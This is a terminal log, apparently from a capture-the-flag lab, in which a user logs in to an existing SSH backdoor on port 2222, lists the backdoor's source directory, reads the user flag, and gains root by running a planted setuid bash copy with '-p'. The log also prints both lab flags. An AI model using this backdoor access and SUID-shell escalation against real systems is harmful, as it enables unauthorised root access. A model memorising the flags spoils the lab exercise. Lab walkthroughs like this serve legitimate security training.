
```sh
┌──(kali㉿kali)-[~]
└─$ ssh james@10.10.43.14 -p 2222
Unable to negotiate with 10.10.43.14 port 2222: no matching host key type found. Their offer: ssh-rsa
┌──(kali㉿kali)-[~]
└─$ ssh james@10.10.43.14 -p 2222 -oHostKeyAlgorithms=+ssh-rsa        
The authenticity of host '[10.10.43.14]:2222 ([10.10.43.14]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.43.14]:2222' (RSA) to the list of known hosts.
james@10.10.43.14's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ ls -la
total 6584
drwxrwxr-x 3 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 james james    4096 Jul 22  2020 ..
drwxrwxr-x 8 james james    4096 Jul 21  2020 .git
-rw-rw-r-- 1 james james     109 Jul 21  2020 README.md
-rwxrwxr-x 1 james james 6634961 Jul 21  2020 backdoor
-rw-rw-r-- 1 james james     362 Jul 22  2020 backdoor.service
-rw-rw-r-- 1 james james     104 Jul 21  2020 build.sh
-rw-rw-r-- 1 james james   60102 Jul 21  2020 cooctus.png
-rw------- 1 james james    1679 Jul 21  2020 id_rsa
-rw-r--r-- 1 james james     407 Jul 21  2020 id_rsa.pub
-rw-rw-r-- 1 james james     815 Jul 21  2020 index.html
-rw-rw-r-- 1 james james    2788 Jul 21  2020 main.go
-rw-rw-r-- 1 james james     241 Jul 21  2020 setup.sh
james@overpass-production:/home/james/ssh-backdoor$ cd ..
james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
james@overpass-production:/home/james$ cat user.txt
thm{d119b4fa8c497ddb0525f7ad200e6567}


james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www

james@overpass-production:/home/james$ ./.suid_bash -p    
.suid_bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
.suid_bash-4.4# cat /root/root.txt
thm{d53b2684f169360bb9606c333873144d}
.suid_bash-4.4# 
```
